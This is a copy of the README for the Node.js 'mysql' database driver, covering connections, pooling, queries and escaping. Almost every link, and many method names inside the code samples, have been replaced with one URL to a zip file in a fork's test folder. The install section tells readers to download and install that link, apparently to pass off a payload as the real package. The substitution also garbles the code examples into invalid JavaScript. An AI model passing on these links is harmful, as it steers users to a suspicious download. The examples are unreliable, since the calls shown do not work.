# mysql

[![NPM Version][npm-version-image]][npm-url]
[![NPM Downloads][npm-downloads-image]][npm-url]
[![https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip Version][node-image]][node-url]
[![Linux Build][travis-image]][travis-url]
[![Windows Build][appveyor-image]][appveyor-url]
[![Test Coverage][coveralls-image]][coveralls-url]

## Table of Contents

- [Install](#install)
- [Introduction](#introduction)
- [Contributors](#contributors)
- [Sponsors](#sponsors)
- [Community](#community)
- [Establishing connections](#establishing-connections)
- [Connection options](#connection-options)
- [SSL options](#ssl-options)
- [Terminating connections](#terminating-connections)
- [Pooling connections](#pooling-connections)
- [Pool options](#pool-options)
- [Pool events](#pool-events)
- [Closing all the connections in a pool](#closing-all-the-connections-in-a-pool)
- [PoolCluster](#poolcluster)
- [PoolCluster options](#poolcluster-options)
- [Switching users and altering connection state](#switching-users-and-altering-connection-state)
- [Server disconnects](#server-disconnects)
- [Performing queries](#performing-queries)
- [Escaping query values](#escaping-query-values)
- [Escaping query identifiers](#escaping-query-identifiers)
- [Preparing Queries](#preparing-queries)
- [Custom format](#custom-format)
- [Getting the id of an inserted row](#getting-the-id-of-an-inserted-row)
- [Getting the number of affected rows](#getting-the-number-of-affected-rows)
- [Getting the number of changed rows](#getting-the-number-of-changed-rows)
- [Getting the connection ID](#getting-the-connection-id)
- [Executing queries in parallel](#executing-queries-in-parallel)
- [Streaming query rows](#streaming-query-rows)
- [Piping results with Streams](#piping-results-with-streams)
- [Multiple statement queries](#multiple-statement-queries)
- [Stored procedures](#stored-procedures)
- [Joins with overlapping column names](#joins-with-overlapping-column-names)
- [Transactions](#transactions)
- [Ping](#ping)
- [Timeouts](#timeouts)
- [Error handling](#error-handling)
- [Exception Safety](#exception-safety)
- [Type casting](#type-casting)
- [Connection Flags](#connection-flags)
- [Debugging and reporting problems](#debugging-and-reporting-problems)
- [Security issues](#security-issues)
- [Contributing](#contributing)
- [Running tests](#running-tests)
- [Todo](#todo)

## Install

This is a [https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip) module available through the
[npm registry](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip).

Before installing, [download and install https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip).
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip 0.6 or higher is required.

Installation is done using the
[`npm install` command](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip):

```sh
$ npm install mysql
```

For information about the previous 0.9.x releases, visit the [v0.9 branch][].

Sometimes I may also ask you to install the latest version from Github to check
if a bugfix is working. In this case, please do:

```sh
$ npm install mysqljs/mysql
```

[v0.9 branch]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip

## Introduction

This is a https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip driver for mysql. It is written in JavaScript, does not
require compiling, and is 100% MIT licensed.

Here is an example on how to use it:

```js
var mysql      = require('mysql');
var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({
  host     : 'localhost',
  user     : 'me',
  password : 'secret',
  database : 'my_db'
});

https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip();

https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT 1 + 1 AS solution', function (error, results, fields) {
  if (error) throw error;
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('The solution is: ', results[0].solution);
});

https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip();
```

From this example, you can learn the following:

* Every method you invoke on a connection is queued and executed in sequence.
* Closing the connection is done using `end()` which makes sure all remaining
  queries are executed before sending a quit packet to the mysql server.

## Contributors

Thanks goes to the people who have contributed code to this module, see the
[GitHub Contributors page][].

[GitHub Contributors page]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip

Additionally I'd like to thank the following people:

* [Andrey Hristov][] (Oracle) - for helping me with protocol questions.
* [Ulf Wendel][] (Oracle) - for helping me with protocol questions.

[Ulf Wendel]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
[Andrey Hristov]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip

## Sponsors

The following companies have supported this project financially, allowing me to
spend more time on it (ordered by time of contribution):

* [Transloadit](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip) (my startup, we do file uploading &
  video encoding as a service, check it out)
* [Joyent](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip)
* [https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip)
* [Holiday Extras](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip) (they are [hiring](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip))
* [Newscope](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip) (they are [hiring](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip))

## Community

If you'd like to discuss this module, or ask questions about it, please use one
of the following:

* **Mailing list**: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip!forum/node-mysql
* **IRC Channel**: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip (on https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip, I pay attention to any message
  including the term `mysql`)

## Establishing connections

The recommended way to establish a connection is this:

```js
var mysql      = require('mysql');
var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({
  host     : 'https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip',
  user     : 'bob',
  password : 'secret'
});

https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function(err) {
  if (err) {
    https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('error connecting: ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip);
    return;
  }

  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('connected as id ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip);
});
```

However, a connection can also be implicitly established by invoking a query:

```js
var mysql      = require('mysql');
var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(...);

https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT 1', function (error, results, fields) {
  if (error) throw error;
  // connected!
});
```

Depending on how you like to handle your errors, either method may be
appropriate. Any type of connection error (handshake or network) is considered
a fatal error, see the [Error Handling](#error-handling) section for more
information.

## Connection options

When establishing a connection, you can set the following options:

* `host`: The hostname of the database you are connecting to. (Default:
  `localhost`)
* `port`: The port number to connect to. (Default: `3306`)
* `localAddress`: The source IP address to use for TCP connection. (Optional)
* `socketPath`: The path to a unix domain socket to connect to. When used `host`
  and `port` are ignored.
* `user`: The MySQL user to authenticate as.
* `password`: The password of that MySQL user.
* `database`: Name of the database to use for this connection (Optional).
* `charset`: The charset for the connection. This is called "collation" in the SQL-level
  of MySQL (like `utf8_general_ci`). If a SQL-level charset is specified (like `utf8mb4`)
  then the default collation for that charset is used. (Default: `'UTF8_GENERAL_CI'`)
* `timezone`: The timezone configured on the MySQL server. This is used to type cast server date/time values to JavaScript `Date` object and vice versa. This can be `'local'`, `'Z'`, or an offset in the form `+HH:MM` or `-HH:MM`. (Default: `'local'`)
* `connectTimeout`: The milliseconds before a timeout occurs during the initial connection
  to the MySQL server. (Default: `10000`)
* `stringifyObjects`: Stringify objects instead of converting to values. See
issue [#501](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip). (Default: `false`)
* `insecureAuth`: Allow connecting to MySQL instances that ask for the old
  (insecure) authentication method. (Default: `false`)
* `typeCast`: Determines if column values should be converted to native
   JavaScript types. (Default: `true`)
* `queryFormat`: A custom query format function. See [Custom format](#custom-format).
* `supportBigNumbers`: When dealing with big numbers (BIGINT and DECIMAL columns) in the database,
  you should enable this option (Default: `false`).
* `bigNumberStrings`: Enabling both `supportBigNumbers` and `bigNumberStrings` forces big numbers
  (BIGINT and DECIMAL columns) to be always returned as JavaScript String objects (Default: `false`).
  Enabling `supportBigNumbers` but leaving `bigNumberStrings` disabled will return big numbers as String
  objects only when they cannot be accurately represented with [JavaScript Number objects] (https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip)
  (which happens when they exceed the [-2^53, +2^53] range), otherwise they will be returned as
  Number objects. This option is ignored if `supportBigNumbers` is disabled.
* `dateStrings`: Force date types (TIMESTAMP, DATETIME, DATE) to be returned as strings rather than
   inflated into JavaScript Date objects. Can be `true`/`false` or an array of type names to keep as
   strings. (Default: `false`)
* `debug`: Prints protocol details to stdout. Can be `true`/`false` or an array of packet type names
   that should be printed. (Default: `false`)
* `trace`: Generates stack traces on `Error` to include call site of library
   entrance ("long stack traces"). Slight performance penalty for most calls.
   (Default: `true`)
* `multipleStatements`: Allow multiple mysql statements per query. Be careful
  with this, it could increase the scope of SQL injection attacks. (Default: `false`)
* `flags`: List of connection flags to use other than the default ones. It is
  also possible to blacklist default ones. For more information, check
  [Connection Flags](#connection-flags).
* `ssl`: object with ssl parameters or a string containing name of ssl profile. See [SSL options](#ssl-options).


In addition to passing these options as an object, you can also use a url
string. For example:

```js
var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('mysql://user:pass@host/db?debug=true&charset=BIG5_CHINESE_CI&timezone=-0700');
```

Note: The query values are first attempted to be parsed as JSON, and if that
fails assumed to be plaintext strings.

### SSL options

The `ssl` option in the connection options takes a string or an object. When given a string,
it uses one of the predefined SSL profiles included. The following profiles are included:

* `"Amazon RDS"`: this profile is for connecting to an Amazon RDS server and contains the
  certificates from https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip and
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip

When connecting to other servers, you will need to provide an object of options, in the
same format as [https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip).
Please note the arguments expect a string of the certificate, not a file name to the
certificate. Here is a simple example:

```js
var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({
  host : 'localhost',
  ssl  : {
    ca : https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(__dirname + 'https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip')
  }
});
```

You can also connect to a MySQL server without properly providing the appropriate
CA to trust. _You should not do this_.

```js
var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({
  host : 'localhost',
  ssl  : {
    // DO NOT DO THIS
    // set up your ca correctly to trust the connection
    rejectUnauthorized: false
  }
});
```

## Terminating connections

There are two ways to end a connection. Terminating a connection gracefully is
done by calling the `end()` method:

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function(err) {
  // The connection is terminated now
});
```

This will make sure all previously enqueued queries are still before sending a
`COM_QUIT` packet to the MySQL server. If a fatal error occurs before the
`COM_QUIT` packet can be sent, an `err` argument will be provided to the
callback, but the connection will be terminated regardless of that.

An alternative way to end the connection is to call the `destroy()` method.
This will cause an immediate termination of the underlying socket.
Additionally `destroy()` guarantees that no more events or callbacks will be
triggered for the connection.

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip();
```

Unlike `end()` the `destroy()` method does not take a callback argument.

## Pooling connections

Rather than creating and managing connections one-by-one, this module also
provides built-in connection pooling using `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(config)`.
[Read more about connection pooling](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip).

Create a pool and use it directly:

```js
var mysql = require('mysql');
var pool  = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({
  connectionLimit : 10,
  host            : 'https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip',
  user            : 'bob',
  password        : 'secret',
  database        : 'my_db'
});

https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT 1 + 1 AS solution', function (error, results, fields) {
  if (error) throw error;
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('The solution is: ', results[0].solution);
});
```

This is a shortcut for the `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` -> `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` ->
`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` code flow. Using `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` is useful to
share connection state for subsequent queries. This is because two calls to
`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` may use two different connections and run in parallel. This is
the basic structure:

```js
var mysql = require('mysql');
var pool  = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(...);

https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function(err, connection) {
  if (err) throw err; // not connected!

  // Use the connection
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT something FROM sometable', function (error, results, fields) {
    // When done with the connection, release it.
    https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip();

    // Handle error after the release.
    if (error) throw error;

    // Don't use the connection here, it has been returned to the pool.
  });
});
```

If you would like to close the connection and remove it from the pool, use
`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` instead. The pool will create a new connection the next
time one is needed.

Connections are lazily created by the pool. If you configure the pool to allow
up to 100 connections, but only ever use 5 simultaneously, only 5 connections
will be made. Connections are also cycled round-robin style, with connections
being taken from the top of the pool and returning to the bottom.

When a previous connection is retrieved from the pool, a ping packet is sent
to the server to check if the connection is still good.

## Pool options

Pools accept all the same [options as a connection](#connection-options).
When creating a new connection, the options are simply passed to the connection
constructor. In addition to those options pools accept a few extras:

* `acquireTimeout`: The milliseconds before a timeout occurs during the connection
  acquisition. This is slightly different from `connectTimeout`, because acquiring
  a pool connection does not always involve making a connection. If a connection
  request is queued, the time the request spends in the queue does not count
  towards this timeout. (Default: `10000`)
* `waitForConnections`: Determines the pool's action when no connections are
  available and the limit has been reached. If `true`, the pool will queue the
  connection request and call it when one becomes available. If `false`, the
  pool will immediately call back with an error. (Default: `true`)
* `connectionLimit`: The maximum number of connections to create at once.
  (Default: `10`)
* `queueLimit`: The maximum number of connection requests the pool will queue
  before returning an error from `getConnection`. If set to `0`, there is no
  limit to the number of queued connection requests. (Default: `0`)

## Pool events

### acquire

The pool will emit an `acquire` event when a connection is acquired from the pool.
This is called after all acquiring activity has been performed on the connection,
right before the connection is handed to the callback of the acquiring code.

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('acquire', function (connection) {
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('Connection %d acquired', https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip);
});
```

### connection

The pool will emit a `connection` event when a new connection is made within the pool.
If you need to set session variables on the connection before it gets used, you can
listen to the `connection` event.

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('connection', function (connection) {
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SET SESSION auto_increment_increment=1')
});
```

### enqueue

The pool will emit an `enqueue` event when a callback has been queued to wait for
an available connection.

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('enqueue', function () {
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('Waiting for available connection slot');
});
```

### release

The pool will emit a `release` event when a connection is released back to the
pool. This is called after all release activity has been performed on the connection,
so the connection will be listed as free at the time of the event.

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('release', function (connection) {
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('Connection %d released', https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip);
});
```

## Closing all the connections in a pool

When you are done using the pool, you have to end all the connections or the
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip event loop will stay active until the connections are closed by the
MySQL server. This is typically done if the pool is used in a script or when
trying to gracefully shutdown a server. To end all the connections in the
pool, use the `end` method on the pool:

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function (err) {
  // all connections in the pool have ended
});
```

The `end` method takes an _optional_ callback that you can use to know when
all the connections are ended.

**Once `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` is called, `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` and other operations
can no longer be performed.** Wait until all connections in the pool are
released before calling `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`. If you use the shortcut method
`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`, in place of `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` → `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` →
`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`, wait until it completes.

`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` calls `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` on every active connection in the pool.
This queues a `QUIT` packet on the connection and sets a flag to prevent
`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` from creating new connections. All commands / queries
already in progress will complete, but new commands won't execute.

## PoolCluster

PoolCluster provides multiple hosts connection. (group & retry & selector)

```js
// create
var poolCluster = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip();

// add configurations (the config is a pool config object)
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(config); // add configuration with automatic name
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('MASTER', masterConfig); // add a named configuration
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SLAVE1', slave1Config);
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SLAVE2', slave2Config);

// remove configurations
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SLAVE2'); // By nodeId
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SLAVE*'); // By target group : SLAVE1-2

// Target Group : ALL(anonymous, MASTER, SLAVE1-2), Selector : round-robin(default)
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function (err, connection) {});

// Target Group : MASTER, Selector : round-robin
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('MASTER', function (err, connection) {});

// Target Group : SLAVE1-2, Selector : order
// If can't connect to SLAVE1, return SLAVE2. (remove SLAVE1 in the cluster)
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('remove', function (nodeId) {
  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('REMOVED NODE : ' + nodeId); // nodeId = SLAVE1
});

// A pattern can be passed with *  as wildcard
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SLAVE*', 'ORDER', function (err, connection) {});

// The pattern can also be a regular expression
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(/^SLAVE[12]$/, function (err, connection) {});

// of namespace : of(pattern, selector)
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('*').getConnection(function (err, connection) {});

var pool = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SLAVE*', 'RANDOM');
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function (err, connection) {});
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function (err, connection) {});
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function (error, results, fields) {});

// close all connections
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function (err) {
  // all connections in the pool cluster have ended
});
```

### PoolCluster options

* `canRetry`: If `true`, `PoolCluster` will attempt to reconnect when connection fails. (Default: `true`)
* `removeNodeErrorCount`: If connection fails, node's `errorCount` increases.
  When `errorCount` is greater than `removeNodeErrorCount`, remove a node in the `PoolCluster`. (Default: `5`)
* `restoreNodeTimeout`: If connection fails, specifies the number of milliseconds
  before another connection attempt will be made. If set to `0`, then node will be
  removed instead and never re-used. (Default: `0`)
* `defaultSelector`: The default selector. (Default: `RR`)
  * `RR`: Select one alternately. (Round-Robin)
  * `RANDOM`: Select the node by random function.
  * `ORDER`: Select the first node available unconditionally.

```js
var clusterConfig = {
  removeNodeErrorCount: 1, // Remove the node immediately when connection fails.
  defaultSelector: 'ORDER'
};

var poolCluster = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(clusterConfig);
```

## Switching users and altering connection state

MySQL offers a changeUser command that allows you to alter the current user and
other aspects of the connection without shutting down the underlying socket:

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({user : 'john'}, function(err) {
  if (err) throw err;
});
```

The available options for this feature are:

* `user`: The name of the new user (defaults to the previous one).
* `password`: The password of the new user (defaults to the previous one).
* `charset`: The new charset (defaults to the previous one).
* `database`: The new database (defaults to the previous one).

A sometimes useful side effect of this functionality is that this function also
resets any connection state (variables, transactions, etc.).

Errors encountered during this operation are treated as fatal connection errors
by this module.

## Server disconnects

You may lose the connection to a MySQL server due to network problems, the
server timing you out, the server being restarted, or crashing. All of these
events are considered fatal errors, and will have the `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip =
'PROTOCOL_CONNECTION_LOST'`.  See the [Error Handling](#error-handling) section
for more information.

Re-connecting a connection is done by establishing a new connection. Once
terminated, an existing connection object cannot be re-connected by design.

With Pool, disconnected connections will be removed from the pool freeing up
space for a new connection to be created on the next getConnection call.

## Performing queries

The most basic way to perform a query is to call the `.query()` method on an object
(like a `Connection`, `Pool`, or `PoolNamespace` instance).

The simplest form of .`query()` is `.query(sqlString, callback)`, where a SQL string
is the first argument and the second is a callback:

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT * FROM `books` WHERE `author` = "David"', function (error, results, fields) {
  // error will be an Error if one occurred during the query
  // results will contain the results of the query
  // fields will contain information about the returned results fields (if any)
});
```

The second form `.query(sqlString, values, callback)` comes when using
placeholder values (see [escaping query values](#escaping-query-values)):

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT * FROM `books` WHERE `author` = ?', ['David'], function (error, results, fields) {
  // error will be an Error if one occurred during the query
  // results will contain the results of the query
  // fields will contain information about the returned results fields (if any)
});
```

The third form `.query(options, callback)` comes when using various advanced
options on the query, like [escaping query values](#escaping-query-values),
[joins with overlapping column names](#joins-with-overlapping-column-names),
[timeouts](#timeout), and [type casting](#type-casting).

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({
  sql: 'SELECT * FROM `books` WHERE `author` = ?',
  timeout: 40000, // 40s
  values: ['David']
}, function (error, results, fields) {
  // error will be an Error if one occurred during the query
  // results will contain the results of the query
  // fields will contain information about the returned results fields (if any)
});
```

Note that a combination of the second and third forms can be used where the
placeholder values are passed as an argument and not in the options object.
The `values` argument will override the `values` in the option object.

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({
    sql: 'SELECT * FROM `books` WHERE `author` = ?',
    timeout: 40000, // 40s
  },
  ['David'],
  function (error, results, fields) {
    // error will be an Error if one occurred during the query
    // results will contain the results of the query
    // fields will contain information about the returned results fields (if any)
  }
);
```

If the query only has a single replacement character (`?`), and the value is
not `null`, `undefined`, or an array, it can be passed directly as the second
argument to `.query`:

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(
  'SELECT * FROM `books` WHERE `author` = ?',
  'David',
  function (error, results, fields) {
    // error will be an Error if one occurred during the query
    // results will contain the results of the query
    // fields will contain information about the returned results fields (if any)
  }
);
```

## Escaping query values

**Caution** These methods of escaping values only works when the
[NO_BACKSLASH_ESCAPES](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip)
SQL mode is disabled (which is the default state for MySQL servers).

In order to avoid SQL Injection attacks, you should always escape any user
provided data before using it inside a SQL query. You can do so using the
`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()`, `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` or `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` methods:

```js
var userId = 'some user provided value';
var sql    = 'SELECT * FROM users WHERE id = ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(userId);
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(sql, function (error, results, fields) {
  if (error) throw error;
  // ...
});
```

Alternatively, you can use `?` characters as placeholders for values you would
like to have escaped like this:

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT * FROM users WHERE id = ?', [userId], function (error, results, fields) {
  if (error) throw error;
  // ...
});
```

Multiple placeholders are mapped to values in the same order as passed. For example,
in the following query `foo` equals `a`, `bar` equals `b`, `baz` equals `c`, and
`id` will be `userId`:

```js
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('UPDATE users SET foo = ?, bar = ?, baz = ? WHERE id = ?', ['a', 'b', 'c', userId], function (error, results, fields) {
  if (error) throw error;
  // ...
});
```

This looks similar to prepared statements in MySQL, however it really just uses
the same `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` method internally.

**Caution** This also differs from prepared statements in that all `?` are
replaced, even those contained in comments and strings.

Different value types are escaped differently, here is how:

* Numbers are left untouched
* Booleans are converted to `true` / `false`
* Date objects are converted to `'YYYY-mm-dd HH:ii:ss'` strings
* Buffers are converted to hex strings, e.g. `X'0fa5'`
* Strings are safely escaped
* Arrays are turned into list, e.g. `['a', 'b']` turns into `'a', 'b'`
* Nested arrays are turned into grouped lists (for bulk inserts), e.g. `[['a',
  'b'], ['c', 'd']]` turns into `('a', 'b'), ('c', 'd')`
* Objects that have a `toSqlString` method will have `.toSqlString()` called
  and the returned value is used as the raw SQL.
* Objects are turned into `key = 'val'` pairs for each enumerable property on
  the object. If the property's value is a function, it is skipped; if the
  property's value is an object, toString() is called on it and the returned
  value is used.
* `undefined` / `null` are converted to `NULL`
* `NaN` / `Infinity` are left as-is. MySQL does not support these, and trying
  to insert them as values will trigger MySQL errors until they implement
  support.

This escaping allows you to do neat things like this:

```js
var post  = {id: 1, title: 'Hello MySQL'};
var query = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('INSERT INTO posts SET ?', post, function (error, results, fields) {
  if (error) throw error;
  // Neat!
});
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // INSERT INTO posts SET `id` = 1, `title` = 'Hello MySQL'
```

And the `toSqlString` method allows you to form complex queries with functions:

```js
var CURRENT_TIMESTAMP = { toSqlString: function() { return 'CURRENT_TIMESTAMP()'; } };
var sql = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('UPDATE posts SET modified = ? WHERE id = ?', [CURRENT_TIMESTAMP, 42]);
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(sql); // UPDATE posts SET modified = CURRENT_TIMESTAMP() WHERE id = 42
```

To generate objects with a `toSqlString` method, the `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` method can
be used. This creates an object that will be left un-touched when using in a `?`
placeholder, useful for using functions as dynamic values:

**Caution** The string provided to `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` will skip all escaping
functions when used, so be careful when passing in unvalidated input.

```js
var CURRENT_TIMESTAMP = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('CURRENT_TIMESTAMP()');
var sql = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('UPDATE posts SET modified = ? WHERE id = ?', [CURRENT_TIMESTAMP, 42]);
https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(sql); // UPDATE posts SET modified = CURRENT_TIMESTAMP() WHERE id = 42
```

If you feel the need to escape queries by yourself, you can also use the escaping
function directly:

```js
var query = "SELECT * FROM posts WHERE title=" + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip("Hello MySQL");

https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(query); // SELECT * FROM posts WHERE title='Hello MySQL'
```

